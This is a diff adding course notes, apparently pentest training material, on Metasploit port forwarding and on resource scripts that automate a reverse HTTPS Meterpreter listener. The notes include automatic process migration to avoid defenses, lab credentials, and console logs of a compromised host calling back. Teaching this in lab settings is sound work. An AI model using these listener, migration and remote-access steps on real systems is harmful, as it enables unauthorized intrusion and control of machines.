+<pre><code>msf6 auxiliary(server/socks_proxy) &gt; sessions  -i 42
+[*] Starting interaction with 42...
+
+meterpreter &gt; portfwd -h
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+
+
+OPTIONS:
+
+    -h   Help banner.
+    -i   Index of the port forward entry to interact with (see the &quot;list&quot; command).
+    -l   Forward: local port to listen on. Reverse: local port to connect to.
+    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r   Forward: remote host to connect to.
+    -R   Indicates a reverse port forward.
+</code></pre>
+<p>We create a local port forward from 4389 localhost to 3389 of the target host.</p>
+<pre><code>meterpreter &gt; portfwd add -l 4389 -p 3389 -r 172.16.128.200
+[*] Forward TCP relay created: (local) :4389 -&gt; (remote) 172.16.128.200:3389
+</code></pre>
+<p>We can test by connecting to <code>127.0.0.1:4389</code> with <code>xfreerdp</code>.</p>
+<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
+└─$ xfreerdp /v:127.0.0.1:4389 /u:luiza /timeout:20000
+</code></pre>
+<h4>20.4 Automating Metasploit</h4>
+<ul>
+<li>Create resource scripts.</li>
+<li>Use <a href="https://docs.rapid7.com/metasploit/resource-scripts/">resource scripts</a> in Metasploit.</li>
+</ul>
+<h5>Resource Scripts</h5>
+<p>MSF resource scripts chain together a series of console comands and Ruby code.  We can use either built-in commands of Metasploit or write Ruby code to manage control flow and develop advanced logic components.</p>
+<p>In a pentest we may need to setup several multi/handler listeners each time we want to receive an incoming reverse shell.  We could let Metasploit run in the background the whole time or start Metasploit and manually start a listener each time.  We could also create a resource script to automate this.</p>
+<p>Let&#39;s create a script that starts a multi/handler listener for a non-staged Win x64 Meterpreter payload.  To do this we create a file in home dir of Kali named <code>listener.rc</code> and open it a text editor.</p>
+<p>We first need to determine the command sequence we want to use.  In this example, the first command activates the multi/handler module.  Next we set the payload, <code>windows/meterpreter_reverse_https</code>, the we set our <code>LHOST</code> and <code>LPORT</code> options.</p>
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST 192.168.119.4
+set LPORT 443
+</code></pre>
+<p>Additionally we can configure the <code>AutoRunScript</code> option to automatically exec a mod after a session is created.  In this example we will use <code>post/windows/manage/migrate</code> module.  This will cause the spawned Meterpreter to automatically launch a background <code>notepad.exe</code> process to migrate to.  Automating process migration helps to avoid situations where our payload is killed prematurely by defensive technology or termination of the process.</p>
+<pre><code>set AutoRunScript post/windows/manage/migrate
+</code></pre>
+<p>We also set <code>ExitOnSession</code> to <code>false</code> to ensure that the listener keeps accepting new connections after a session is created.</p>
+<pre><code>set ExitOnSession false
+</code></pre>
+<p><em>We can also configure advanced options such as ExitOnSession in multi/handler and AutoRunScript in payloads by using show advanced within the activated module or selected payload.</em></p>
+<p>Finally we add <code>run</code> with args <code>-z -j</code> to run it as a job in the bg and stop us from automatically interacting with the session.</p>
+<pre><code>run -z -j
+</code></pre>
+<p>Save the script and start Metasploit by passing the resource script as arg for <code>-r</code>.</p>
+<pre><code class="language-bash">sudo msfconsole -r listener.rc
+</code></pre>
+<p>Or import it into a running session.</p>
+<pre><code>msf6 &gt; resource listener.rc 
+[*] Processing /home/operator/OffSec/msf/listener.rc for ERB directives.
+resource (/home/operator/OffSec/msf/listener.rc)&gt; use exploit/multi/handler
+[*] Using configured payload windows/x64/meterpreter_reverse_https
+resource (/home/operator/OffSec/msf/listener.rc)&gt; set PAYLOAD windows/meterpreter_reverse_https
+PAYLOAD =&gt; windows/meterpreter_reverse_https
+resource (/home/operator/OffSec/msf/listener.rc)&gt; set LHOST 192.168.45.207
+LHOST =&gt; 192.168.45.207
+resource (/home/operator/OffSec/msf/listener.rc)&gt; set LPORT 443
+LPORT =&gt; 443
+resource (/home/operator/OffSec/msf/listener.rc)&gt; set AutoRunScript post/windows/manage/migrate
+AutoRunScript =&gt; post/windows/manage/migrate
+resource (/home/operator/OffSec/msf/listener.rc)&gt; set ExitOnSession false
+ExitOnSession =&gt; false
+resource (/home/operator/OffSec/msf/listener.rc)&gt; run -z -j
+[*] Exploit running as background job 3.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.45.207:443
+</code></pre>
+<ul>
+<li>All of our commands were executed from the script.</li>
+</ul>
+<p>let&#39;s connect to BRUTE2 via RDP with user <code>justin</code> and password <code>SuperS3cure1337#</code>, start PowerShell, download our mal Win bin <code>met.exe</code> that we used previously.</p>
+<pre><code>[!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Redirecting stageless connection from /FNYmHRbQWmG7KLoq3kt59QhAdFPJvMnkV2S9mtqTtNlFmz-DxmF6tOosWU1xpKfaFFO2HoI6fTmcJJ8YS with UA &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0&#39;
+[!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Attaching orphaned/stageless session...
+[!] https://192.168.45.207:443 handling request from 192.168.205.202; (UUID: hweqg9oz) Without a database connected that payload UUID tracking will not work!
+[*] Session ID 44 (192.168.45.207:443 -&gt; 192.168.205.202:60820) processing AutoRunScript &#39;post/windows/manage/migrate&#39;
+[*] Running module against BRUTE2
+[*] Current server process: mtr.exe (3660)
+[*] Spawning notepad.exe process to migrate into
+[*] Spoofing PPID 0
+[*] Migrating into 5752
+[+] Successfully migrated into process 5752
+[*] Meterpreter session 44 opened (192.168.45.207:443 -&gt; 192.168.205.202:60820) at 2023-11-26 14:13:55 -0800
+</code></pre>
+<ul>
+<li>Metasploit automatically migrated the session to the newly spawned process.</li>
+</ul>
+<p>Instead of creating our own resource scripts we can use the scripts provided by Metasploit found in <code>/usr/share/metasploit-framework/scripts/resource</code>.</p>
+<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
+└─$ ls -l /usr/share/metasploit-framework/scripts/resource
+total 156
+-rw-r--r-- 1 root root  7270 Aug 24 03:07 auto_brute.rc
+-rw-r--r-- 1 root root  2203 Aug 24 03:07 autocrawler.rc
+-rw-r--r-- 1 root root 11225 Aug 24 03:07 auto_cred_checker.rc
+-rw-r--r-- 1 root root  6565 Aug 24 03:07 autoexploit.rc
+-rw-r--r-- 1 root root  3422 Aug 24 03:07 auto_pass_the_hash.rc
+-rw-r--r-- 1 root root   876 Aug 24 03:07 auto_win32_multihandler.rc
+-rw-r--r-- 1 root root   155 Aug 24 03:07 bap_all.rc
+-rw-r--r-- 1 root root   762 Aug 24 03:07 bap_dryrun_only.rc
+-rw-r--r-- 1 root root   365 Aug 24 03:07 bap_firefox_only.rc
+-rw-r--r-- 1 root root   358 Aug 24 03:07 bap_flash_only.rc
+-rw-r--r-- 1 root root   354 Aug 24 03:07 bap_ie_only.rc
+-rw-r--r-- 1 root root 20767 Aug 24 03:07 basic_discovery.rc
+-rw-r--r-- 1 root root  4518 Aug 24 03:07 dev_checks.rc
+-rw-r--r-- 1 root root  3358 Aug 24 03:07 fileformat_generator.rc
+-rw-r--r-- 1 root root  1085 Aug 24 03:07 meterpreter_compatibility.rc
+-rw-r--r-- 1 root root  1064 Aug 24 03:07 mssql_brute.rc
+-rw-r--r-- 1 root root  4346 Aug 24 03:07 multi_post.rc
+-rw-r--r-- 1 root root  1222 Aug 24 03:07 nessus_vulns_cleaner.rc
+-rw-r--r-- 1 root root  1659 Aug 24 03:07 oracle_login.rc
+-rw-r--r-- 1 root root   840 Aug 24 03:07 oracle_sids.rc
+-rw-r--r-- 1 root root   490 Aug 24 03:07 oracle_tns.rc
+-rw-r--r-- 1 root root   833 Aug 24 03:07 port_cleaner.rc
+-rw-r--r-- 1 root root  2419 Aug 24 03:07 portscan.rc
+-rw-r--r-- 1 root root  1251 Aug 24 03:07 run_all_post.rc
+-rw-r--r-- 1 root root   333 Aug 24 03:07 run_cve-2022-22960_lpe.rc
+-rw-r--r-- 1 root root  3084 Aug 24 03:07 smb_checks.rc
+-rw-r--r-- 1 root root  3837 Aug 24 03:07 smb_validate.rc
+-rw-r--r-- 1 root root  2592 Aug 24 03:07 wmap_autotest.rc
+</code></pre>
+<ul>
+<li>There are resource scripts provided for.</li>
+<li>Port scanning.</li>
+<li>Brute forcing.</li>
+<li>Protocol enumerations.</li>
+<li>And many more.</li>
+<li>Before using them.</li>
+<li>Examine.</li>
+<li>Understand.</li>
+<li>Modify to fit our needs.</li>
+</ul>
+<p>Some scripts use the global datastore of Metasploit to set options like <code>RHOSTS</code>.  When we use <code>set</code> or <code>unset</code> we define options in the context of a running module.  We can also define values for options across all mods by setting <em>global</em> options, with <code>setg</code> and <code>unsetg</code>.</p>
+<p>Resource scripts can automate parts of pentests.  We can create a set of resource scripts for repetative tasks and operations.  We can prepare those scripts and then modify them for each pentest.  Example, we can prepare resource scripts for listeners, pivoting, post-exploitation, etc.  Using them for multiple tests can save a lot of time.</p>
+
+      </div>
+    </article>
+  
